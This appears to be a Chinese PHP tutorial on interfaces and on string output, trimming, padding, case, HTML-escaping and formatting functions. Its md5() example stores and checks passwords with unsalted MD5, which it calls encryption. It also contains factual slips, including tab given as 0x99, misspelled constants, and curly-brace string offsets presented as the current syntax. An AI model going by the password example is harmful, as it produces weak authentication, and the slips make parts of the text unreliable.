<h3><span id="接口技术">接口技术</span></h3><p>接口是一种特殊的抽象类，而抽象类又是一种特殊的类，所以接口也是一种特殊的类。接口中声明的方法必须都是抽象方法，另外不能在接口中声明变量，只能使用const关键字声明为常量的成员属性，而且接口中所有成员都必须有public的访问权限。<br>类的声明是使用“class”关键字标识的，而接口的声明则使用“interface”关键字表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">interface 接口名称｛			//使用interface关键字声明接口</span><br><span class="line">	//常量成员				//接口中的成员属性只能是常量，不能是变量</span><br><span class="line">	//抽象方法				//接口中的所有方法必须是抽象方法，不能有非抽象的方法存在</span><br><span class="line">｝						//接口中的成员也需要用花括号包含起来</span><br></pre></td></tr></table></figure></p>
<p>如果需要使用接口中的成员，则需要通过子类去实现接口中的全部抽象方法，然后创建子类的对象去调用在子类中实现后的方法。但通过类去继承接口时需要使用implements关键字来实现，而并不是是哟个extends关键字完成。如果需要使用抽象类去实现接口中的部分方法，也需要使用implements关键字实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	interface One &#123;                              //声明一个接口使用interface关键字，One为接口名称</span><br><span class="line">		const CONSTANT = &apos;CONSTANT value&apos;;    //在接口中声明一个常量成员属性，和在类中声明一样</span><br><span class="line">		function fun1();                         //在接口中声明一个抽象方法“fun1()”</span><br><span class="line">		function fun2();                         //在接口中声明另一个抽象方法“fun2()”</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	abstract class Three implements One &#123;          //声明一个抽象类去实现接口One中的第二个方法</span><br><span class="line">		function fun2() &#123;                       //只实现接口中的一个抽象方法</span><br><span class="line">			//具体的实现内容由子类自决定</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class Four implements One &#123;                 //声明一个类实现接口One中的全部抽象方法</span><br><span class="line">		function fun1() &#123;                      //实现接口中第一个方法</span><br><span class="line">			//具体的实现内容由子类自决定</span><br><span class="line">		&#125;	</span><br><span class="line"></span><br><span class="line">		function fun2() &#123;                     //实现接口中的第二个方法</span><br><span class="line">			//具体的实现内容由子类自决定</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>PHP是单继承的，一个类只能有一个父类，但是一个类可以实现多个接口。将要实现的多个接口之间使用逗号分隔开，而且在子类中要将所有接口中的抽象方法全部实现才可以创建对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class 类名 implements 接口一，接口二...接口n&#123;  //一个类实现多个接口</span><br><span class="line">			//实现所有接口中的抽象类</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实现多个接口是使用“implements”关键字，同时还可以使用“extends”关键字继承一个类。即在继承一个类的同时实现多个接口，但一定要先使用extends继承一类再去使用imlements实现多个接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class  类名 extends 父类名 implements 接口一，接口二...接口n&#123;  //继承一个类的同时实现多个接口</span><br><span class="line">		//实现所有接口中的抽象类</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1><span id="字符串处理与正则表达式">字符串处理与正则表达式</span></h1><h2><span id="字符串的处理介绍">字符串的处理介绍</span></h2><h3><span id="字符串的处理方式">字符串的处理方式</span></h3><p>在PHP中，提供了大量的字符串操作函数，功能强大，使用也比较简单。但对一些比较复杂的字符串操作，则需要借助PHP所支持的正则表达式来实现。如果字符串处理函数和正则表达式都可以实现字符串操作，建议使用字符串处理函数来完成，因为字符串的处理函数要比正则表达式处理字符串的效率高。</p>
<h3><span id="字符串类型的特点">字符串类型的特点</span></h3><p>因为PHP是弱类型语言，所以其他类型的数据一般都可以直接应用于字符串操作函数里，而自动转化为字符串进行处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo substr(&quot;1234567&quot;,2,4);				//将字符串用于字符串函数substr()处理，输出子字符串345</span><br><span class="line">	echo substr(123456,2,4);				//将整型用于字符串substr()处理，输出同样是字符串345</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>还可以将字符串视为数组，当做字符集合看待<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$str=&quot;lamp&quot;;				//声明一个字符串$str，值为lamp</span><br><span class="line">	echo $str.&quot;&lt;br&gt;&quot;;			//将字符串看作是一个连续的实体，一起输出lamp</span><br><span class="line">	//以下将字符串看作字符集合，按数组方式一个一个输出</span><br><span class="line">	echo $str[0];			//输出字符串$str中第一个字符l</span><br><span class="line">	echo $str[1];			//输出字符串$str中第一个字符a</span><br><span class="line">	echo $str[2];			//输出字符串$str中第一个字符m</span><br><span class="line">	echo $str[3];			//输出字符串$str中第一个字符p</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>但将字符串看做字符集合时，PHP脚本引擎无法区分是字符还是数组，会带来二义性。所以中括号的语法已不再使用，替代它的是使用花括号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$str=&quot;lamp&quot;;		//声明一个字符串$str，值为lamp</span><br><span class="line">	echo $str&#123;0&#125;;		//输出字符串$str中第一个字符l</span><br><span class="line">	echo $str&#123;1&#125;;		//输出字符串$str中第一个字符a</span><br><span class="line">	echo $str&#123;2&#125;;		//输出字符串$str中第一个字符m</span><br><span class="line">	echo $str&#123;3&#125;;		//输出字符串$str中第一个字符p</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="常用的字符串输出函数">常用的字符串输出函数</span></h2><table>
<thead>
<tr>
<th>函数名</th>
<th style="text-align:left">功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>echo()</td>
<td style="text-align:left">输出字符串</td>
</tr>
<tr>
<td>print()</td>
<td style="text-align:left">输出一个或多个字符串</td>
</tr>
<tr>
<td>die()</td>
<td style="text-align:left">输出一条消息，并退出当前脚本</td>
</tr>
<tr>
<td>printf()</td>
<td style="text-align:left">输出格式化字符串</td>
</tr>
<tr>
<td>sprintf()</td>
<td style="text-align:left">把格式化的字符串写入一个变量中</td>
</tr>
</tbody>
</table>
<h3><span id="函数echo">函数echo()</span></h3><p>该函数用于输出一个或多个字符串，是在PHP中使用最多的函数，因为使用它的效率要比其他字符串输出函数高。echo()实际上不是一个函数，因此您不需对其使用括号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$str = &quot;What&apos;s LAMP?&quot;;             //定义一个字符串$str</span><br><span class="line">	echo $str;                         //可以直接输出字符串变量</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;                      //也可以直接输出字符串</span><br><span class="line">	echo $str.&quot;&lt;br&gt;Linux+Apache+MySQL+PHP&lt;br&gt;&quot;;  //还可以使用点运算符号连接多个字符串输出</span><br><span class="line"></span><br><span class="line">	echo &quot;This                    </span><br><span class="line">	      text </span><br><span class="line">	      spans </span><br><span class="line">	      multiple </span><br><span class="line">	      lines.&lt;br&gt;&quot;;                //可以将一行文本换成多行输出</span><br><span class="line"></span><br><span class="line">	echo &apos;This &apos;,&apos;string &apos;,&apos;was &apos;,&apos;made &apos;,&apos;with multiple parameters&lt;br&gt;&apos;;  //可以输出用逗号隔开的多个参数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="函数print">函数print()</span></h3><p>该函数的功能和echo()的一样，它有返回值，若成功则返回1，失败则返回0。它的执行效率没有echo()函数高。</p>
<h3><span id="函数die">函数die()</span></h3><p>该函数是exit()函数的别名。如果参数是一个字符串，则该函数会在退出前输出它。如果参数是一个整数，这个值会被用做退出状态。退出状态的值在0至254之间。退出状态255有PHP保留，不会被使用。状态0用于成功地终止程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$url = &quot;http://www.lampbrother.net&quot;;               //定义一个网络文件的位置</span><br><span class="line">	fopen($url,&quot;r&quot;)	or die(&quot;Unable to connect to $url&quot;);  //如果打开失败则输出一条消息并退出程序</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="函数printf">函数printf()</span></h3><p>该函数用于输出格式化的字符串，和C语言的同名函数用法一样。第一个参数为必选项，是规定的字符串以及如何格式化其中的变量。还可以有多个可选参数，是规定插到第一个参数的格式化字符串中对应%符号处的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(format,arg1,arg2,...,argn)</span><br></pre></td></tr></table></figure></p>
<p>第一个参数中使用的转换格式，是以百分比符号（“%”）开始到转换字符结束。</p>
<table>
<thead>
<tr>
<th>格式</th>
<th style="text-align:left">功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>%%</td>
<td style="text-align:left">返回百分比符号</td>
</tr>
<tr>
<td>%b</td>
<td style="text-align:left">二进制数</td>
</tr>
<tr>
<td>%c</td>
<td style="text-align:left">按照ASCII值的字符</td>
</tr>
<tr>
<td>%d</td>
<td style="text-align:left">带符号十进制数</td>
</tr>
<tr>
<td>%e</td>
<td style="text-align:left">科学计数法</td>
</tr>
<tr>
<td>%u</td>
<td style="text-align:left">无符号十进制数</td>
</tr>
<tr>
<td>%f</td>
<td style="text-align:left">浮点数（local setting aware）</td>
</tr>
<tr>
<td>%F</td>
<td style="text-align:left">浮点数（not local setting aware）</td>
</tr>
<tr>
<td>%o</td>
<td style="text-align:left">八进制数</td>
</tr>
<tr>
<td>%s</td>
<td style="text-align:left">字符串</td>
</tr>
<tr>
<td>%x</td>
<td style="text-align:left">十六进制数（小写字母）</td>
</tr>
<tr>
<td>%X</td>
<td style="text-align:left">十六进制数（大写字母）</td>
</tr>
</tbody>
</table>
<p>arg1,arg2,argn等参数将插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个%符号中，插入arg1，在第二个%符号处，插入arg2，依次类推。如果%符号多于arg参数，则必须使用占位符。占位符被插入%符号之后，由数组和“\$”组成。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$str = &quot;LAMP&quot;;             //声明一个字符串数据</span><br><span class="line">	$number = 789;             //声明一个整型数据</span><br><span class="line">     </span><br><span class="line">	//将字符串$str在第一个参数中的%处输出，按%s的字符串输出，整型$number按%u输出</span><br><span class="line">	printf(&quot;%s book. page number %u &lt;br&gt;&quot;,$str,$number);       </span><br><span class="line">	printf(&quot;%0.3f &lt;br&gt;&quot;,$number);  //将整型$number按浮点数输出，并在小数点后保留3位</span><br><span class="line"></span><br><span class="line">	$format = &quot;The %2\$s book contains %1\$d pages.</span><br><span class="line">           That&apos;s a nice %2\$s full of %1\$d pages. &lt;br&gt;&quot;;   //定义一个格式并在其中使用占位符</span><br><span class="line">	printf($format, $number, $str);  //按格式的占位符号输出多次变量，%2$s位置处是第三个参数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="函数sprintf">函数sprintf()</span></h3><p>该函数的用法和printf()的格式相似，但它并不是输出字符串，而是把格式化的字符串以返回值的形式写入到一个变量中。这样就可以将格式化后的字符串在需要时使用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$num= 12345;              	 //声明一个整数12345</span><br><span class="line">	$txt = sprintf(&quot;%0.2f&quot;,$num);    //转换为保留两位小数的浮点数，并赋值给变量$text</span><br><span class="line">	echo $txt;                  	 //在需要的地方就可以使用格式化后的文本$txt</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="常用的字符串格式化函数">常用的字符串格式化函数</span></h2><table>
<thead>
<tr>
<th>格式</th>
<th style="text-align:left">功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>ltrim()</td>
<td style="text-align:left">从字符串左侧删除空格或者其他预定义字符</td>
</tr>
<tr>
<td>rtrim()</td>
<td style="text-align:left">从字符串的末端开始删除空白字符或其他预定义字符</td>
</tr>
<tr>
<td>trim()</td>
<td style="text-align:left">从字符串的两端删除空白字符和其他预定义字符</td>
</tr>
<tr>
<td>str_pad()</td>
<td style="text-align:left">把字符串填充为新的长度</td>
</tr>
<tr>
<td>strtolower()</td>
<td style="text-align:left">把字符串转换为小写</td>
</tr>
<tr>
<td>strtoupper()</td>
<td style="text-align:left">把字符串转化为大写</td>
</tr>
<tr>
<td>ucfirst()</td>
<td style="text-align:left">把字符串中的首字符转换为大写</td>
</tr>
<tr>
<td>ucwords()</td>
<td style="text-align:left">把字符串中每个单词的首字符转换为大写</td>
</tr>
<tr>
<td>nl2br()</td>
<td style="text-align:left">在字符串中的每行之间插入HTML换行符</td>
</tr>
<tr>
<td>htmlentities()</td>
<td style="text-align:left">把字符转化为HTML实体</td>
</tr>
<tr>
<td>htmlspecialchears()</td>
<td style="text-align:left">把一些预定义的字符转换为HTML实体</td>
</tr>
<tr>
<td>Stripslashes()</td>
<td style="text-align:left">删除由addcslashes()函数添加的反斜杠</td>
</tr>
<tr>
<td>strip_tags()</td>
<td style="text-align:left">剥去HTML、XML以及PHP的标签</td>
</tr>
<tr>
<td>number_format()</td>
<td style="text-align:left">通过千位分组来格式化数字</td>
</tr>
<tr>
<td>strrev()</td>
<td style="text-align:left">反转字符串</td>
</tr>
<tr>
<td>md5()</td>
<td style="text-align:left">将一个字符串进行MD5计算</td>
</tr>
</tbody>
</table>
<h3><span id="取出空格和字符串填补函数">取出空格和字符串填补函数</span></h3><p>在PHP中可以通过ltrim()、rtrim()和trim()函数利用处理字符串中多余的空格，或者一些其他没有意义的符号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string ltrim(string str[,string charlist])		//从字符串左侧删除空格或者其他预定义字符</span><br><span class="line">string rtrim(string str[,string charlist])		//从字符串右侧删除空白字符或其他预定义字符</span><br><span class="line">string trim(string str[,string charlist])		//从字符串的两端删除空白字符和其他预定义字符</span><br></pre></td></tr></table></figure></p>
<p>这三个函数分别用于从字符串的左、右和两端删除空白字符或其他预定义字符。处理后的结果都会以新字符串的形式返回，不会在原字符串上修改。其中第一个参数str是待处理的字符串，为必选项。第二个参数charlist是过滤字符串，用于指定希望去除的特殊符号，该参数为可选。如果不指定过滤字符串，默认情况下会去掉下列字符：</p>
<ul>
<li>“ ”：ASCII为32的字符（0x20），即空格</li>
<li>“\0”：ASCII为0的字符（0x00），即NULL</li>
<li>“\t”：ASCII为9的字符（0x99），即制表符</li>
<li>“\n”：ASCII为10的字符（0x0A），即新行</li>
<li>“\r”：ASCII为13的字符（0x0D），即回车</li>
</ul>
<p>此外还可以使用“..”符号指定需要取出的一个范围，例如“0..9”或“a..z”表示去掉ASCII码值中的数字和小写字母。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$str=&quot;   lamp  &quot;;  //声明一个字符串，其中左侧有3个空格，右侧2个空格，总长度为9个字符</span><br><span class="line">	echo strlen($str);            //输出字符串的总长度 9</span><br><span class="line">	echo strlen(ltrim($str));       //去掉左侧空格后的长度输出为 6</span><br><span class="line">	echo strlen(rtrim($str));       //去掉右侧空格后的长度输出为 7</span><br><span class="line">	echo strlen(trim($str));        //去掉两侧空格后的长度输出为 4</span><br><span class="line"></span><br><span class="line">	$str=&quot;123 This is a test ...&quot;;    //声明一个测试字符串，左侧为数字开头，右侧为省略号“…”</span><br><span class="line">	echo ltrim($str, &quot;0..9&quot;);       //过滤掉字符串左侧的数字，输出：This is a test ...</span><br><span class="line">	echo rtrim($str, &quot;.&quot;);         //过滤掉字符串右侧的所有“.”，输出：123 This is a test</span><br><span class="line">	echo trim($str, &quot;0..9 A..Z .&quot;);  //过滤掉字符串两端的数字和大写字母还有“.”，输出：his is a test</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>不仅可以按需求过滤字符串中的内容，还可以使用str_pad()函数按需求对字符串进行填补。可以用于对一些敏感信息的保护。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string str_pad(string input,int pad_length[,string pad_string[,int pad_type]])</span><br></pre></td></tr></table></figure></p>
<p>该函数有四个参数，第一个参数是必选项，指明要处理的字符串。第二个参数也是必选项，给丁处理后字符串的长度，如果该值小于原始字符串的长度，则不进行任何操作。第三个参数指定填补时所用的字符串，它为可选参数。如果没有指定则默认使用空格填补。最后一个参数指定填补的方向，它有三个可选值：STR_PAD_BOTH、STR_PAD_LEFT和STR_PAD_RIGHT，分别代表在字符串两端、左和右进行填补。也是一个可选参数，如果没有指定则默认值是STR_PAD_RIGHT。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$str= &quot;LAMP&quot;;                           </span><br><span class="line">	echo str_pad($str, 10);        //指定长度为10，默认使用空格在右边填补&quot;LAMP      &quot;</span><br><span class="line">	echo str_pad($str, 10, &quot;-=&quot;, STR_PAD_LEFT);  //指定长度为10，指定在左边填补&quot; -=-=-=LAMP&quot;</span><br><span class="line">	echo str_pad($str, 10, &quot;_&quot;, STR_PAD_BOTH);  //指定长度为10，指定两端填补 &quot; ___LAMP___&quot;</span><br><span class="line">	echo str_pad($str, 6 , &quot;___&quot;);                //指定长度为6， 默认在右边填补&quot; LAMP__&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="字符串大小写转换">字符串大小写转换</span></h3><p>在PHP中提供了四个字符串大小写的转换函数，它们都只有一个可选参数，即传入要进行转换的字符串。利用直接使用这些函数完成大小写转换的操作。函数strtoupper()用于将给定的字符串全部转换为大写字母；函数strtolower()用于将给定的字符串全部转换为小写字母；函数ucfirst()用于将给定的字符串中首字母转换为大写，其余字符不变；函数ucwords()用于将给定的字符串中全部以空格分隔的单词首字母转换为大写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp= &quot;lamp is composed of Linux、Apache、MySQL and PHP&quot;;</span><br><span class="line">	echo strtolower($lamp);  //输出lamp is composed of linux、apache、mysql and php </span><br><span class="line">	echo strtoupper($lamp);  //输出LAMP IS COMPOSED OF LINUX、APACHE、MYSQL AND PHP </span><br><span class="line">	echo ucfirst($lamp);     //输出Lamp is composed of Linux、Apache、MySQL and PHP</span><br><span class="line">	echo ucwords($lamp);   //输出Lamp Is Composed Of Linux、Apache、MySQL And PHP </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="和html标签相关的字符串格式化">和HTML标签相关的字符串格式化</span></h3><h4><span id="函数nl2br">函数nl2br()</span></h4><p>nl2br()函数是在字符串中的每个新行“\n”之前插入HTML换行符“<br>”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo nl2br(&quot;One line.\nAnother line.&quot;);        //在“\n”前加上“&lt;br /&gt;”标记</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="函数htmlspecialchars">函数htmlspecialchars()</span></h3><p>htmlspecialchars()函数可以将一些预定义的字符转换为HTML实体。此函数用在预防使用者提供的文字中包含了HTML的标记。<br>以下是该函数可以转化的字符</p>
<ul>
<li>“&amp;”（和号）转换为“&amp;”。</li>
<li>“””（双引号）转换为“&quot;”。</li>
<li>“‘“(单引号)转换为“&#039;”。</li>
<li>“&lt;”（小于）转换为“&lt;”。</li>
<li>“&gt;”（小于）转换为“&gt;”。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string htmlspecialchars(string string[,int quote_style[,string charset]])</span><br></pre></td></tr></table></figure>
<p>该函数中第一个参数是带有HTML标记待处理的字符串，为必选参数。第二个参数为可选参数，用来决定引号的转换方式。默认值为ENT_COMPAT将只转换双引号，而保留单引号；NET_QUOTES将同时转换这两种引号；而RNT_NOQUOTES将不对引号进行转换。第三个参数也是可选的值，用于指定所处理字符串的字符集，默认的字符集是“ISO8859-1”.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			$str = &quot;&lt;B&gt;WebServer:&lt;/B&gt; &amp; &apos;Linux&apos; &amp; &apos;Apache&apos;&quot;; //常有HTML标记和单引号的字符串</span><br><span class="line">			echo htmlspecialchars($str, ENT_COMPAT);      //转换HTML标记和转换双引号</span><br><span class="line">			echo &quot;&lt;br&gt;\n&quot;;</span><br><span class="line">			echo htmlspecialchars($str, ENT_QUOTES);      //转换HTML标记和转换两种引号</span><br><span class="line">			echo &quot;&lt;br&gt;\n&quot;;</span><br><span class="line">			echo htmlspecialchars($str, ENT_NOQUOTES);   //转换HTML标记和不对引号转换</span><br><span class="line">		?&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>在PHP中还提供了htmllentities()函数，可以将所有的非ASCII码字符转换为对应的实体代码。该函数与htmlspecialchars()函数的使用语法格式一致，但该函数可以转义更多的HTML字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$str = &quot;一个 &apos;quote&apos; 是 &lt;b&gt;bold&lt;/b&gt;&quot;;</span><br><span class="line"></span><br><span class="line">	// 输出: &amp;Ograve;&amp;raquo;&amp;cedil;&amp;ouml; &apos;quote&apos; &amp;Ecirc;&amp;Ccedil; &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;</span><br><span class="line">	echo htmlentities($str);</span><br><span class="line"></span><br><span class="line">	// 输出: 一个 &amp;#039;quote&amp;#039; 是 &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;</span><br><span class="line">	echo htmlentities($str, ENT_QUOTES,gb2312);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="其他字符串格式化函数">其他字符串格式化函数</span></h3><h4><span id="函数strrev">函数strrev()</span></h4><p>该函数的作用是将输入的字符反转，只提供一个要处理的字符串作为参数，返回反转后的字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo strrev(&quot;you are sb&quot;);		//反转输出：bs era uoy </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数number_format">函数number_format()</span></h4><p>number_format()函数通过千位分组来格式化数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string number_format(float number[,int decimals[,string dec_point,string thousands_sep]])</span><br></pre></td></tr></table></figure></p>
<p>该函数返回格式化后的数组，该函数支持一个、两个或四个参数（不是三个）。第一个参数为必选项，提供要被格式化的数字。如果未设置其他参数，则数字会被格式化为不带小数点且以逗号（，）作为分隔符的数字。第二个参数是可选项，规定使用多少个小数位。如果设置了该参数，则使用点号（.）作为小数点来格式化数字。第三个参数也是可选的参数，规定用什么字符串作为小数点。第四个参数也为可选参数，规定用做千位分隔符的字符串。如果设置了该参数，那么所有其他参数都是必需的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$number=123456789;                   //声明一个数字</span><br><span class="line">	echo number_format($number);           //输出123,456,789千位分隔的字符串</span><br><span class="line">	echo number_format($number, 2);         //输出123,456,789.00小数点后保留两数小数 </span><br><span class="line">	echo number_format($number, 2, &quot;,&quot;, &quot;.&quot;);   //输出123.456.789,00 千位使用(,)分隔并保留两位小数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数md5">函数md5()</span></h4><p>md5()函数的作用就是讲一个字符串进行MD5算法加密，默认返回一个32位的十六进制字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string md5(string str[,bool raw_output])		//进行MD5算法加密演算</span><br></pre></td></tr></table></figure></p>
<p>其中第一个参数标识待处理的字符串，是必选项。第二个参数需要一个布尔型数值，是可选项。默认为FALSE，返回一个32位十六进制字符串。如果设置为TURE，将返回一个16位的二进制数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$password= &quot;lampbrother&quot;;          //定义一个字符串作为密码，加密后保存到数据库中</span><br><span class="line">	echo md5($password).&quot;&lt;br&gt;&quot;;       //输出MD5加密后的值：5f1ba7d4b4bf96fb8e7ae52fc6297aee</span><br><span class="line"></span><br><span class="line">	if (md5($password) == &apos;5f1ba7d4b4bf96fb8e7ae52fc6297aee&apos;) &#123;  //将输入的密码和数据库保存的匹配</span><br><span class="line">  		echo &quot;密码一致，登录成功&quot;;                         //如果相同则会输出这条信息</span><br><span class="line">  	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在PHP中提供了一个对文件进行MD5加密的函数md5_file()，使用的方式和md5()函数相似。</p>
<h2><span id="字符串比较函数">字符串比较函数</span></h2><h3><span id="按字节顺序进行字符串比较">按字节顺序进行字符串比较</span></h3><p>按字节顺序进行字符串的比较可以使用strcmp()和strcasecmp()两个函数，其中函数strcasecmp()可以忽略字符串中字母的大小写进行比较。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int strcmp(string str1,string str2)			//区分字符串中字母大小写地比较</span><br><span class="line">int strcasecmp(string str1,string str2)			//忽略字符串字母大小写地比较</span><br></pre></td></tr></table></figure></p>
